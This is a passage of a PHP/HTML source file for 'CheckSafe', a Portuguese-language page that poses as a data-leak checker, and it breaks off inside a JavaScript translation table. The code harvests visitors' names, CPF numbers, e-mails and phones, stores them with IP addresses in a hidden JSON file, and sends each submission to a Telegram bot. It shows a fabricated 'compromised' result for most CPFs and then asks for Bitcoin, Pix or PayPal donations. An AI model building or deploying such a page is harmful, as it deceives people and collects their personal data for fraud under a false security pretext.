<?php
require __DIR__ . '/config.php';
$CHECKSAFE_SETTINGS = checksafe_load_settings();

function somente_digitos($valor) { return preg_replace('/\D+/', '', (string)$valor); }
function limpar_texto($valor) { return trim(strip_tags((string)$valor)); }
function esc_html($texto) { return htmlspecialchars((string)$texto, ENT_QUOTES, 'UTF-8'); }

function mascarar_cpf($cpf) { $d = somente_digitos($cpf); return strlen($d) === 11 ? substr($d,0,3) . '.***.***-' . substr($d,-2) : $cpf; }
function mascarar_email($email) { $email = (string)$email; if (!str_contains($email, '@')) return $email; [$u,$d] = explode('@',$email,2); return substr($u,0,2) . str_repeat('*', max(2, strlen($u)-2)) . '@' . $d; }
function mascarar_tel($tel) { $d = somente_digitos($tel); return strlen($d) >= 10 ? '(' . substr($d,0,2) . ') *****-' . substr($d,-4) : $tel; }

function enviar_telegram_demo($token, $chatId, $mensagem) {
    if (!$token || !$chatId || $token === 'COLOQUE_SEU_TOKEN_AQUI' || $chatId === 'COLOQUE_SEU_CHAT_ID_AQUI') return false;
    $url = 'https://api.telegram.org/bot' . trim($token) . '/sendMessage';
    $payload = ['chat_id'=>trim($chatId),'text'=>$mensagem,'parse_mode'=>'HTML','disable_web_page_preview'=>true];
    $ch = curl_init($url);
    curl_setopt_array($ch, [CURLOPT_POST=>true,CURLOPT_POSTFIELDS=>$payload,CURLOPT_RETURNTRANSFER=>true,CURLOPT_TIMEOUT=>15,CURLOPT_CONNECTTIMEOUT=>8]);
    $resposta = curl_exec($ch);
    $httpCode = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return $resposta !== false && $httpCode >= 200 && $httpCode < 300;
}

function checksafe_empresas_demo(): array {
    $settings = $GLOBALS['CHECKSAFE_SETTINGS'] ?? checksafe_load_settings();
    return is_array($settings['empresas'] ?? null) ? $settings['empresas'] : [];
}
function checksafe_hash_cpf(string $cpf): int { $hash=0; for($i=0;$i<strlen($cpf);$i++){ $hash=(($hash<<5)-$hash)+ord($cpf[$i]); $hash=$hash & 0xFFFFFFFF; if($hash & 0x80000000){ $hash=-((~$hash & 0xFFFFFFFF)+1); } } return abs($hash); }
function checksafe_resultado_por_cpf(string $cpf): array {
    $settings = $GLOBALS['CHECKSAFE_SETTINGS'] ?? checksafe_load_settings();
    $cpfLimpo = somente_digitos($cpf) ?: substr(hash('sha256', (string)$cpf), 0, 11);
    $h = checksafe_hash_cpf($cpfLimpo);
    $teste = strtolower(trim((string)($_GET['teste'] ?? $_GET['resultado'] ?? '')));
    if (in_array($teste, ['seguro','safe','ok'], true)) return ['seguro'=>true,'status'=>'seguro','quantidade'=>0,'empresas'=>[]];
    $rate = max(0, min(100, (int)($settings['results']['compromised_rate'] ?? 80)));
    $min = max(1, (int)($settings['results']['min_occurrences'] ?? 1));
    $max = max($min, (int)($settings['results']['max_occurrences'] ?? 6));
    $seguro = (($h % 100) >= $rate);
    if (in_array($teste, ['vazado','comprometido','danger','risco'], true)) $seguro = false;
    if ($seguro) return ['seguro'=>true,'status'=>'seguro','quantidade'=>0,'empresas'=>[]];
    $empresas = checksafe_empresas_demo();
    if (!$empresas) return ['seguro'=>false,'status'=>'comprometido','quantidade'=>0,'empresas'=>[]];
    $range = max(1, $max - $min + 1);
    $quantidade = min(count($empresas), $min + ($h % $range));
    $inicio = $h % count($empresas); $lista=[];
    for($i=0;$i<$quantidade;$i++) $lista[]=$empresas[($inicio+$i)%count($empresas)];
    return ['seguro'=>false,'status'=>'comprometido','quantidade'=>$quantidade,'empresas'=>$lista];
}
function checksafe_storage_dir(): string {
    $dir = $GLOBALS['CHECKSAFE_DATA_DIR'] ?? (__DIR__ . '/checksafe_storage');
    return rtrim((string)$dir, '/\\');
}
function checksafe_json_path(): string {
    $dir = checksafe_storage_dir();
    $file = $GLOBALS['CHECKSAFE_JSON_FILE'] ?? ('consultas_' . substr(hash('sha256', __DIR__ . '|checksafe-json'), 0, 16) . '.json');
    return $dir . '/' . basename((string)$file);
}
function checksafe_salvar_consulta(array $dados, array $resultado): bool {
    $dir = checksafe_storage_dir(); if(!is_dir($dir)) @mkdir($dir,0755,true);
    $htaccess = $dir . '/.htaccess'; if(!is_file($htaccess)) @file_put_contents($htaccess, "Require all denied\nDeny from all\nOptions -Indexes\n");
    $index = $dir . '/index.php'; if(!is_file($index)) @file_put_contents($index, "<?php http_response_code(403); exit('Acesso negado.');");
    $arquivo = checksafe_json_path(); $base = ['atualizado_em'=>date('c'),'total_consultas'=>0,'cpfs'=>[]];
    if(is_file($arquivo)){ $decodificado=json_decode((string)@file_get_contents($arquivo), true); if(is_array($decodificado)){ $base=array_merge($base,$decodificado); if(!isset($base['cpfs']) || !is_array($base['cpfs'])) $base['cpfs']=[]; } }
    $cpfKey = somente_digitos((string)($dados['cpf'] ?? '')); if($cpfKey==='') return false;
    if(!isset($base['cpfs'][$cpfKey]) || !is_array($base['cpfs'][$cpfKey])){
        $base['cpfs'][$cpfKey]=['cpf'=>$cpfKey,'primeira_consulta'=>date('c'),'ultima_consulta'=>date('c'),'total_consultas'=>0,'dados_atuais'=>[],'resultado_fixo'=>$resultado,'historico'=>[]];
    } else {
        $resultado = $base['cpfs'][$cpfKey]['resultado_fixo'] ?? $resultado;
    }
    $registro=['data'=>date('c'),'ip'=>$_SERVER['REMOTE_ADDR'] ?? 'Não identificado','user_agent'=>$_SERVER['HTTP_USER_AGENT'] ?? 'Não identificado','inputs'=>$dados,'resultado'=>$resultado];
    $base['cpfs'][$cpfKey]['ultima_consulta']=date('c');
    $base['cpfs'][$cpfKey]['total_consultas']=(int)($base['cpfs'][$cpfKey]['total_consultas'] ?? 0)+1;
    $base['cpfs'][$cpfKey]['dados_atuais']=$dados;
    $base['cpfs'][$cpfKey]['resultado_fixo']=$resultado;
    $base['cpfs'][$cpfKey]['historico'][]=$registro;
    $base['atualizado_em']=date('c'); $base['total_consultas']=(int)($base['total_consultas'] ?? 0)+1;
    $json=json_encode($base, JSON_PRETTY_PRINT|JSON_UNESCAPED_UNICODE|JSON_UNESCAPED_SLASHES);
    return $json !== false && @file_put_contents($arquivo,$json,LOCK_EX) !== false;
}
function checksafe_ajax(): bool { return strtolower((string)($_SERVER['HTTP_X_REQUESTED_WITH'] ?? '')) === 'fetch'; }
function checksafe_responder_json(array $payload): void { header('Content-Type: application/json; charset=utf-8'); echo json_encode($payload, JSON_UNESCAPED_UNICODE|JSON_UNESCAPED_SLASHES); exit; }

$sucesso = null; $erro = null;
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!empty($_POST['website'])) { $erro = 'Não foi possível concluir a verificação.'; }
    else {
        $formId = preg_replace('/[^a-zA-Z0-9_]/', '', (string)($_POST['form_id'] ?? 'dados01'));
        $formsCfg = $CHECKSAFE_SETTINGS['forms'] ?? ['dados01'=>($CHECKSAFE_SETTINGS['form'] ?? [])];
        $selectedForm = $formsCfg[$formId] ?? ($formsCfg['dados01'] ?? ($CHECKSAFE_SETTINGS['form'] ?? []));
        $fields = $selectedForm['fields'] ?? [];
        $dadosConsulta = ['form_id'=>$formId, 'origem_form'=>limpar_texto($_POST['origem_form'] ?? ($selectedForm['title'] ?? 'Consulta principal')), 'tipo_consulta'=>limpar_texto($_POST['produto'] ?? 'Verificação de segurança'), 'data'=>date('d/m/Y H:i:s')];
        foreach ($fields as $field) {
            if (empty($field['enabled'])) continue;
            $name = preg_replace('/[^a-zA-Z0-9_]/', '', (string)($field['name'] ?? ''));
            if ($name === '') continue;
            $value = limpar_texto($_POST[$name] ?? '');
            $dadosConsulta[$name] = $value ?: 'Não informado';
            if (!empty($field['required']) && $value === '') $erro = 'Preencha o campo: ' . ($field['label'] ?? $name);
            if (($field['type'] ?? '') === 'email' && $value !== '' && !filter_var($value, FILTER_VALIDATE_EMAIL)) $erro = 'Informe um e-mail válido.';
            if (($field['type'] ?? '') === 'cpf' && $value !== '' && strlen(somente_digitos($value)) !== 11) $erro = 'Informe um CPF válido com 11 dígitos.';
            if (($field['type'] ?? '') === 'phone' && $value !== '' && strlen(somente_digitos($value)) < 10) $erro = 'Informe um telefone válido.';
        }
        $cpfBase = somente_digitos((string)($dadosConsulta['cpf'] ?? ''));
        if ($cpfBase === '') $cpfBase = substr(preg_replace('/\D+/', '', hash('sha256', json_encode($dadosConsulta))), 0, 11);
        if (!$erro) {
            $data=date('d/m/Y H:i:s'); $ip=$_SERVER['REMOTE_ADDR'] ?? 'Não identificado';
            $mensagem="🔎 <b>NOVA CONSULTA</b>

";
            foreach ($dadosConsulta as $k=>$v) {
                if (in_array($k, ['data'], true)) continue;
                $mensagem .= "• <b>" . esc_html(ucfirst(str_replace('_',' ', $k))) . ":</b> " . esc_html($v) . "
";
            }
            $mensagem .= "🕒 <b>Data:</b> ".esc_html($data)."
🌐 <b>IP:</b> ".esc_html($ip);
            $dadosConsulta['cpf_digitos']=$cpfBase; $dadosConsulta['ip']=$ip;
            $resultadoConsulta=checksafe_resultado_por_cpf($cpfBase); $salvouJson=checksafe_salvar_consulta($dadosConsulta,$resultadoConsulta); $ok=enviar_telegram_demo($TELEGRAM_BOT_TOKEN ?? '', $TELEGRAM_CHAT_ID ?? '', $mensagem);
            if (checksafe_ajax()) checksafe_responder_json(['ok'=>true,'telegram'=>$ok,'salvou_json'=>$salvouJson,'dados'=>$dadosConsulta,'resultado'=>$resultadoConsulta]);
            $sucesso=$ok ? 'Verificação enviada com sucesso.' : 'Consulta salva. Telegram não configurado ou indisponível.';
        }
    }
    if ($erro && checksafe_ajax()) checksafe_responder_json(['ok'=>false,'erro'=>$erro]);
}

if (!empty($CHECKSAFE_SETTINGS['maintenance']['active']) && $_SERVER['REQUEST_METHOD'] !== 'POST') {
    $titulo = $CHECKSAFE_SETTINGS['maintenance']['title'] ?? 'Site em manutenção';
    $msg = $CHECKSAFE_SETTINGS['maintenance']['message'] ?? 'Estamos fazendo ajustes. Volte novamente em alguns minutos.';
    ?><!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title><?= esc_html($titulo) ?></title><link rel="icon" type="image/svg+xml" href="assets/favicon.svg"><link rel="stylesheet" href="assets/style.css?v=<?= filemtime(__DIR__ . '/assets/style.css') ?>"></head><body><div class="top-line"></div><main class="maintenance-page"><section class="maintenance-card"><div class="maintenance-icon">🛠️</div><h1><?= esc_html($titulo) ?></h1><p><?= esc_html($msg) ?></p><span>CheckSafe</span></section></main></body></html><?php
    exit;
}

?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="format-detection" content="telephone=no, date=no, address=no, email=no">
<title>CheckSafe Demo</title>
<link rel="icon" type="image/svg+xml" href="assets/favicon.svg">
<link rel="manifest" href="assets/site.webmanifest">
<meta name="theme-color" content="#041421">
<meta name="description" content="CheckSafe: consulta demonstrativa de segurança digital com relatório visual.">
<meta property="og:title" content="CheckSafe - Verifique seus dados">
<meta property="og:description" content="Faça uma verificação demonstrativa e veja um relatório visual moderno.">
<meta property="og:type" content="website">
<meta property="og:image" content="assets/favicon.svg">
<meta property="og:url" content="<?= esc_html((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https://' : 'http://') . ($_SERVER['HTTP_HOST'] ?? '') . ($_SERVER['REQUEST_URI'] ?? '')) ?>">
<link rel="stylesheet" href="assets/style.css?v=<?= filemtime(__DIR__ . '/assets/style.css') ?>">
</head>
<body>
<div class="top-line"></div>
<header class="site-header">
    <a class="brand" href="#topo">Check<span>Safe</span></a>
    <nav><a href="#topo" data-i18n="navHome">Início</a><a href="#verificar" data-i18n="navCheck">Consultar</a><a href="#sobre" data-i18n="navAbout">Sobre</a><a href="#desempenho" data-i18n="navTech">Tecnologia</a><a href="#apoio" data-i18n="navSupport">Apoiar</a></nav>
    <div class="lang-switch"><button type="button" data-lang="pt">PT</button><button type="button" data-lang="es">ES</button><button type="button" data-lang="en">EN</button></div>
</header>
<main id="topo">
<section class="hero"><h1 data-i18n-html="heroTitle">Informações vazadas<br><span>Verificar?</span></h1><p data-i18n="heroSub">Verifique se suas informações foram vazadas em algum aplicativo ou site!</p><a class="hero-button" href="#verificar" data-i18n="heroBtn">Começar a verificar</a></section>
<section class="stats-strip" aria-label="Estatísticas demonstrativas"><div><strong class="stat-number">1.011</strong><span data-i18n="statBases">bases simuladas</span></div><div><strong class="stat-number">17.658.105.223</strong><span data-i18n="statRecords">registros analisados</span></div></section>

<?php if ($sucesso): ?><div class="message success page-message"><?= esc_html($sucesso) ?></div><?php endif; ?>
<?php if ($erro): ?><div class="message error page-message"><?= esc_html($erro) ?></div><?php endif; ?>

<section class="search-panel type-selector-card" id="verificar">
    <div class="panel-title"><h2 data-i18n="chooseTitle">Qual informação deseja pesquisar?</h2><p data-i18n="chooseSub">Selecione uma opção para liberar o formulário de consulta logo abaixo.</p></div>
    <div class="query-type-grid" role="radiogroup" aria-label="Tipo de informação">
        <label class="query-type-option active"><input type="radio" name="tipo_pesquisa_ui" value="dados01" checked><span><strong data-i18n="data01Title">Dados pessoas 01</strong><small data-i18n="data01Sub">Consulta principal de dados pessoais.</small></span></label>
        <label class="query-type-option"><input type="radio" name="tipo_pesquisa_ui" value="dados02"><span><strong data-i18n="data02Title">Dados pessoas 02</strong><small data-i18n="data02Sub">Consulta complementar de dados pessoais.</small></span></label>
    </div>
    <button type="button" id="abrirConsultaSelecionada" class="select-query-button" data-i18n="continueBtn">Continuar</button>
</section>

<section class="search-panel consulta-card form-card-hidden" id="formulario-consulta">
    <?php $CHECKSAFE_FORMS = $CHECKSAFE_SETTINGS['forms'] ?? ['dados01'=>($CHECKSAFE_SETTINGS['form'] ?? [])]; $FORM_INICIAL = $CHECKSAFE_FORMS['dados01'] ?? ($CHECKSAFE_SETTINGS['form'] ?? []); ?>
    <div class="panel-title"><h2><?= esc_html($FORM_INICIAL['title'] ?? 'Consulta de dados') ?></h2><p><?= esc_html($FORM_INICIAL['subtitle'] ?? 'Preencha as informações para fazer uma verificação.') ?></p></div>
    <form method="post" class="formConsulta" autocomplete="off">
        <input type="text" name="website" class="hp" tabindex="-1" autocomplete="off">
        <input type="hidden" name="form_id" value="dados01">
        <input type="hidden" name="origem_form" value="Dados pessoas 01">
        <input type="hidden" name="produto" value="Dados pessoas 01">
        <input type="hidden" name="extra" value="">
        <div class="form-grid" id="dynamic-form-fields">
            <?php
        $fields = $FORM_INICIAL['fields'] ?? [];
        foreach ($fields as $field):
            if (empty($field['enabled'])) continue;
            $name = preg_replace('/[^a-zA-Z0-9_]/', '', (string)($field['name'] ?? ''));
            if ($name === '') continue;
            $type = (string)($field['type'] ?? 'text');
            $inputType = $type === 'email' ? 'email' : 'text';
            $max = $type === 'cpf' ? ' maxlength="14"' : ($type === 'phone' ? ' maxlength="15"' : '');
            $req = !empty($field['required']) ? ' required' : '';
        ?>
            <label><span><?= esc_html($field['label'] ?? $name) ?></span><input name="<?= esc_html($name) ?>" type="<?= esc_html($inputType) ?>" placeholder="<?= esc_html($field['placeholder'] ?? '') ?>" data-field-type="<?= esc_html($type) ?>"<?= $max ?><?= $req ?>></label>
        <?php endforeach; ?>
        </div>
        <button type="submit"><?= esc_html($FORM_INICIAL['button'] ?? 'Verificar agora') ?></button>
    </form>
    <div class="scanner-wrap" aria-live="polite"><div class="planet-scanner"><div class="planet"><span class="continent c1"></span><span class="continent c2"></span><span class="continent c3"></span></div><div class="orbit"><span class="satellite">🛰️</span></div><span class="signal signal-one"></span><span class="signal signal-two"></span></div><div class="scan-text"><h3 class="scanTitle">Buscando registros...</h3><p class="scanMessage">Conectando ao sistema de análise global.</p><div class="scan-progress"><span></span></div></div></div>
    <div class="result-card" aria-live="polite"></div>
    <button type="button" id="voltarOpcoesConsulta" class="back-options-button" data-i18n="backOptionsBtn">← Voltar para opções</button>
</section>

<section class="info-split" id="sobre"><article class="info-main"><h3 data-i18n="aboutTitle">Por que verificar seus dados?</h3><p data-i18n="aboutP1">Quando informações pessoais aparecem em bases expostas, elas podem ser usadas em tentativas de golpe, cadastros indevidos e contatos suspeitos. A consulta demonstrativa simula uma análise para mostrar como um sistema de verificação pode organizar essas informações.</p><p><b data-i18n="eduLabel">Projeto educativo:</b> <span data-i18n="aboutP2">os resultados exibidos são simulados para fins de apresentação escolar, com visual inspirado em plataformas modernas de consulta online.</span></p></article><article class="info-card-list"><h3 data-i18n="analyzeTitle">O que o sistema analisa?</h3><div class="mini-feature"><span>🛡️</span><div><b data-i18n="feat1T">Validação do cadastro</b><p data-i18n="feat1P">Confere se os campos foram preenchidos corretamente antes da análise.</p></div></div><div class="mini-feature"><span>📡</span><div><b data-i18n="feat2T">Busca demonstrativa</b><p data-i18n="feat2P">Exibe uma varredura visual com satélite e mensagens em tempo real.</p></div></div><div class="mini-feature"><span>📊</span><div><b data-i18n="feat3T">Relatório final</b><p data-i18n="feat3P">Mostra um resultado seguro ou comprometido com detalhes organizados.</p></div></div></article></section>
<section class="performance" id="desempenho"><h2 data-i18n="perfTitle">🛡️ Desempenho da verificação</h2><div class="perf-cards"><div><strong>18B+</strong><span data-i18n="perf1">consultas simuladas</span></div><div><strong>&gt;99,9%</strong><span data-i18n="perf2">estabilidade visual</span></div><div><strong>335</strong><span data-i18n="perf3">pontos de análise</span></div></div><div class="map-card"><div><h3 data-i18n="mapTitle">Análise distribuída globalmente</h3><p data-i18n="mapP1">Durante a verificação, o sistema simula a comunicação entre múltiplos pontos de análise distribuídos ao redor do mundo.</p><p data-i18n="mapP2">Os satélites representam a sincronização das informações entre diferentes camadas de validação, criando uma experiência visual moderna durante a consulta.</p></div><div class="space-map" aria-hidden="true"><span class="star s1"></span><span class="star s2"></span><span class="star s3"></span><span class="star s4"></span><div class="global-planet"><span class="continent gp1"></span><span class="continent gp2"></span><span class="continent gp3"></span><span class="continent gp4"></span></div><span class="space-signal sig-a"></span><span class="space-signal sig-b"></span><span class="space-signal sig-c"></span><div class="space-orbit orbit-a"><span>🛰️</span></div><div class="space-orbit orbit-b"><span>🛰️</span></div><div class="space-orbit orbit-c"><span>🛰️</span></div><div class="connection-line line-a"></div><div class="connection-line line-b"></div><div class="connection-line line-c"></div></div></div></section>
<section class="privacy-box process-box" id="como-funciona">
    <div class="process-head">
        <span class="process-icon">🛡️</span>
        <div>
            <h2>Como funciona a verificação</h2>
            <p>Entenda rapidamente como o sistema organiza a consulta demonstrativa.</p>
        </div>
    </div>
    <div class="process-steps">
        <article><span>1</span><strong>Recebimento dos dados</strong><p>As informações preenchidas são conferidas antes da análise visual.</p></article>
        <article><span>2</span><strong>Validação simulada</strong><p>O sistema apresenta etapas de verificação com animação e mensagens em tempo real.</p></article>
        <article><span>3</span><strong>Relatório demonstrativo</strong><p>O resultado final aparece organizado, claro e fácil de entender.</p></article>
    </div>
</section>

<section class="donation-panel" id="doacao" aria-hidden="true"><div class="donation-title"><h2 data-i18n="donationTitle"><span>₿</span> Opções de doação</h2><p data-i18n="donationP">Escolha uma das opções demonstrativas abaixo para apoiar o projeto.</p><span class="donation-badge" data-i18n="demoBadge">100% demonstrativo</span></div><div class="donation-grid"><article class="donation-card"><h3>Bitcoin</h3><div class="qr-demo"></div><code>bc1q-checksafe-demo-bitcoin</code><button type="button" onclick="copiarDoacao('bc1q-checksafe-demo-bitcoin')" data-i18n="copyAddress">Copiar endereço</button></article><article class="donation-card"><h3>Pix</h3><div class="qr-demo pix"></div><code>apoio@checksafe.demo</code><button type="button" onclick="copiarDoacao('apoio@checksafe.demo')" data-i18n="copyPix">Copiar chave Pix</button></article></div><div class="paypal-box"><h2>PayPal</h2><p data-i18n="paypalP">Troque o link abaixo pelo seu link real quando quiser.</p><a class="paypal-button" href="#" onclick="alert('Coloque aqui seu link real de doação.'); return false;" data-i18n="paypalBtn">Doar via PayPal</a></div><button type="button" class="donation-back" id="voltarApoio" data-i18n="backBtn">← Voltar</button></section>
<section class="support-box" id="apoio"><span class="support-heart">♥</span><h2 data-i18n="supportTitle">Apoie este projeto</h2><p data-i18n="supportP">O CheckSafe é uma demonstração educativa criada para apresentar uma experiência moderna de consulta e segurança digital. Se este projeto foi útil para você, considere apoiar o desenvolvimento.</p><button type="button" class="donate-button" id="abrirDoacao" data-i18n="supportBtn">Apoiar o projeto</button></section>
<section class="share-site-card" id="compartilhar"><div><span class="share-kicker">Compartilhe</span><h2>Envie o CheckSafe no WhatsApp</h2><p>Convide outras pessoas para fazerem uma verificação demonstrativa com visual moderno.</p></div><button type="button" class="whatsapp-share-btn" onclick="compartilharSiteWhatsApp()">💬 Compartilhar no WhatsApp</button></section>
</main>
<footer class="site-footer"><div><h3>CheckSafe</h3><p data-i18n="footerP">Consulta demonstrativa de dados para apresentação escolar.</p></div><div><h3 data-i18n="footerServices">Serviços</h3><a href="#verificar" data-i18n="footerConsult">Consulta de dados</a><a href="#sobre" data-i18n="footerHow">Como funciona</a><a href="#desempenho" data-i18n="navTech">Tecnologia</a><a href="#apoio" data-i18n="navSupport">Apoiar</a></div><div><h3 data-i18n="footerInfo">Informações</h3><a href="#topo" data-i18n="navHome">Início</a><a href="#verificar" data-i18n="navCheck">Verificar</a><a href="#sobre" data-i18n="navAbout">Sobre</a><a href="admin_consultas.php">Admin JSON</a></div><small>CheckSafe © <?= date('Y') ?> - <span data-i18n="footerDemo">Projeto demonstrativo</span></small></footer>
<script>
const CHECKSAFE_FORMS_CONFIG = <?= json_encode($CHECKSAFE_SETTINGS['forms'] ?? ['dados01'=>($CHECKSAFE_SETTINGS['form'] ?? [])], JSON_UNESCAPED_UNICODE|JSON_UNESCAPED_SLASHES) ?>;
</script>
<script>
const I18N = {
pt:{navHome:'Início',navCheck:'Consultar',navAbout:'Sobre',navTech:'Tecnologia',navSupport:'Apoiar',heroTitle:'Informações vazadas<br><span>Verificar?</span>',heroSub:'Verifique se suas informações foram vazadas em algum aplicativo ou site!',heroBtn:'Começar a verificar',statBases:'bases simuladas',statRecords:'registros analisados',chooseTitle:'Qual informação deseja pesquisar?',chooseSub:'Selecione uma opção para liberar o formulário de consulta logo abaixo.',data01Title:'Dados pessoas 01',data01Sub:'Consulta principal de dados pessoais.',data02Title:'Dados pessoas 02',data02Sub:'Consulta complementar de dados pessoais.',continueBtn:'Continuar',backOptionsBtn:'← Voltar para opções',panel1Title:'Consulta de dados',panel1Sub:'Preencha as informações para fazer uma verificação.',panel2Title:'Consulta complementar',panel2Sub:'Pesquise outros tipos de informação usando o mesmo fluxo de envio e relatório.',nameLabel:'Nome completo',namePh:'Digite seu nome',cpfLabel:'CPF',emailLabel:'E-mail',phoneLabel:'Telefone',phonePh:'(00) 00000-0000',cityLabel:'Cidade',cityPh:'Digite sua cidade',extraLabel:'Informação adicional',extraPh:'Ex: usuário, domínio, documento ou referência',typeLabel:'Tipo de consulta',optSecurity:'Verificação de segurança',optExposure:'Consulta de exposição de dados',optFull:'Análise completa',optCpf:'Análise por CPF',optPhone:'Análise por telefone',optEmail:'Análise por e-mail',submitBtn:'Verificar agora',scanSteps:[['Iniciando varredura...','Preparando os dados para a consulta segura.'],['Conectando ao satélite...','Sincronizando pontos de verificação ao redor do mundo.'],['Cruzando informações...','Comparando dados em múltiplas camadas de análise.'],['Validando identidade...','Procurando possíveis ocorrências relacionadas ao cadastro.'],['Finalizando relatório...','Organizando o resultado final da verificação.']],safeTitle:'Dados seguros',safeP:'Nenhuma ocorrência relevante foi localizada durante a análise demonstrativa. Os principais dados informados foram verificados e o relatório foi concluído com status seguro.',safeStatus:'Status: protegido',safeBoxT:'✅ Nenhuma ocorrência encontrada',safeBoxP:'O sistema não encontrou registros críticos relacionados ao cadastro informado.',dangerTitle:'Dados comprometidos',dangerP:'A análise encontrou possíveis sinais de exposição. Abaixo estão exemplos de empresas e serviços simulados que apareceriam em um relatório.',dangerStatus:'Status: atenção necessária',occurrence:'ocorrência demonstrativa encontrada',occurrences:'ocorrências demonstrativas encontradas',fixedCpf:'A quantidade e as empresas são geradas de forma fixa pelo CPF informado. O mesmo CPF sempre mostra o mesmo resultado.',found:'Encontrado',compromisedData:'Dados comprometidos',share:'Compartilhar resultado',retry:'Fazer nova pesquisa',copied:'Resultado copiado para compartilhar.',aboutTitle:'Por que verificar seus dados?',aboutP1:'Quando informações pessoais aparecem em bases expostas, elas podem ser usadas em tentativas de golpe, cadastros indevidos e contatos suspeitos. A consulta demonstrativa simula uma análise para mostrar como um sistema de verificação pode organizar essas informações.',eduLabel:'Projeto educativo:',aboutP2:'os resultados exibidos são simulados para fins de apresentação escolar, com visual inspirado em plataformas modernas de consulta online.',analyzeTitle:'O que o sistema analisa?',feat1T:'Validação do cadastro',feat1P:'Confere se os campos foram preenchidos corretamente antes da análise.',feat2T:'Busca demonstrativa',feat2P:'Exibe uma varredura visual com satélite e mensagens em tempo real.',feat3T:'Relatório final',feat3P:'Mostra um resultado seguro ou comprometido com detalhes organizados.',perfTitle:'🛡️ Desempenho da verificação',perf1:'consultas simuladas',perf2:'estabilidade visual',perf3:'pontos de análise',mapTitle:'Análise distribuída globalmente',mapP1:'Durante a verificação, o sistema simula a comunicação entre múltiplos pontos de análise distribuídos ao redor do mundo.',mapP2:'Os satélites representam a sincronização das informações entre diferentes camadas de validação, criando uma experiência visual moderna durante a consulta.',privacyText:'Durante a demonstração, o sistema apresenta uma experiência de consulta com validação, animação de processamento e relatório visual. A proposta é mostrar como uma página de verificação pode ser estruturada com clareza, confiança e boa apresentação.',supportTitle:'Apoie este projeto',supportP:'O CheckSafe é uma demonstração educativa criada para apresentar uma experiência moderna de consulta e segurança digital. Se este projeto foi útil para você, considere apoiar o desenvolvimento.',supportBtn:'Apoiar o projeto',donationTitle:'<span>₿</span> Opções de doação',donationP:'Escolha uma das opções demonstrativas abaixo para apoiar o projeto.',demoBadge:'100% demonstrativo',copyAddress:'Copiar endereço',copyPix:'Copiar chave Pix',paypalP:'Troque o link abaixo pelo seu link real quando quiser.',paypalBtn:'Doar via PayPal',backBtn:'← Voltar',footerP:'Consulta demonstrativa de dados para apresentação escolar.',footerServices:'Serviços',footerConsult:'Consulta de dados',footerHow:'Como funciona',footerInfo:'Informações',footerDemo:'Projeto demonstrativo'},
es:{navHome:'Inicio',navCheck:'Consultar',navAbout:'Acerca de',navTech:'Tecnología',navSupport:'Apoyar',heroTitle:'Información filtrada<br><span>¿Verificar?</span>',heroSub:'Comprueba si tu información fue expuesta en alguna aplicación o sitio.',heroBtn:'Empezar verificación',statBases:'bases simuladas',statRecords:'registros analizados',chooseTitle:'¿Qué información deseas buscar?',chooseSub:'Selecciona una opción para mostrar el formulario debajo.',data01Title:'Datos personales 01',data01Sub:'Consulta principal de datos personales.',data02Title:'Datos personales 02',data02Sub:'Consulta complementaria de datos personales.',continueBtn:'Continuar',backOptionsBtn:'← Volver a opciones',panel1Title:'Consulta de datos',panel1Sub:'Completa la información para realizar una verificación.',panel2Title:'Consulta complementaria',panel2Sub:'Busca otros tipos de información usando el mismo envío e informe.',nameLabel:'Nombre completo',namePh:'Escribe tu nombre',cpfLabel:'CPF',emailLabel:'Correo electrónico',phoneLabel:'Teléfono',phonePh:'(00) 00000-0000',cityLabel:'Ciudad',cityPh:'Escribe tu ciudad',extraLabel:'Información adicional',extraPh:'Ej: usuario, dominio, documento o referencia',typeLabel:'Tipo de consulta',optSecurity:'Verificación de seguridad',optExposure:'Consulta de exposición de datos',optFull:'Análisis completo',optCpf:'Análisis por CPF',optPhone:'Análisis por teléfono',optEmail:'Análisis por correo',submitBtn:'Verificar ahora',scanSteps:[['Iniciando escaneo...','Preparando los datos para una consulta segura.'],['Conectando al satélite...','Sincronizando puntos de verificación globales.'],['Cruzando información...','Comparando datos en múltiples capas de análisis.'],['Validando identidad...','Buscando posibles ocurrencias relacionadas con el registro.'],['Finalizando informe...','Organizando el resultado final de la verificación.']],safeTitle:'Datos seguros',safeP:'No se localizaron ocurrencias relevantes durante el análisis demostrativo.',safeStatus:'Estado: protegido',safeBoxT:'✅ Ninguna ocurrencia encontrada',safeBoxP:'El sistema no encontró registros críticos relacionados con el registro informado.',dangerTitle:'Datos comprometidos',dangerP:'El análisis encontró posibles señales de exposición. Abajo hay ejemplos simulados.',dangerStatus:'Estado: requiere atención',occurrence:'ocurrencia demostrativa encontrada',occurrences:'ocurrencias demostrativas encontradas',fixedCpf:'La cantidad y las empresas se generan de forma fija por el CPF informado. El mismo CPF siempre muestra el mismo resultado.',found:'Encontrado',compromisedData:'Datos comprometidos',share:'Compartir resultado',retry:'Hacer nueva búsqueda',copied:'Resultado copiado para compartir.',aboutTitle:'¿Por qué verificar tus datos?',aboutP1:'Cuando la información personal aparece en bases expuestas, puede utilizarse en intentos de fraude, registros indebidos y contactos sospechosos.',eduLabel:'Proyecto educativo:',aboutP2:'los resultados son simulados para presentación escolar.',analyzeTitle:'¿Qué analiza el sistema?',feat1T:'Validación del registro',feat1P:'Comprueba si los campos fueron completados correctamente antes del análisis.',feat2T:'Búsqueda demostrativa',feat2P:'Muestra un escaneo visual con satélite y mensajes en tiempo real.',feat3T:'Informe final',feat3P:'Muestra un resultado seguro o comprometido con detalles organizados.',perfTitle:'🛡️ Rendimiento de la verificación',perf1:'consultas simuladas',perf2:'estabilidad visual',perf3:'puntos de análisis',mapTitle:'Análisis distribuido globalmente',mapP1:'Durante la verificación, el sistema simula comunicación entre múltiples puntos de análisis.',mapP2:'Los satélites representan la sincronización de la información entre distintas capas.',privacyText:'Durante la demostración, el sistema presenta una experiencia de consulta con validación, animación de procesamiento e informe visual.',supportTitle:'Apoya este proyecto',supportP:'CheckSafe es una demostración educativa creada para presentar una experiencia moderna de consulta y seguridad digital.',supportBtn:'Apoyar el proyecto',donationTitle:'<span>₿</span> Opciones de 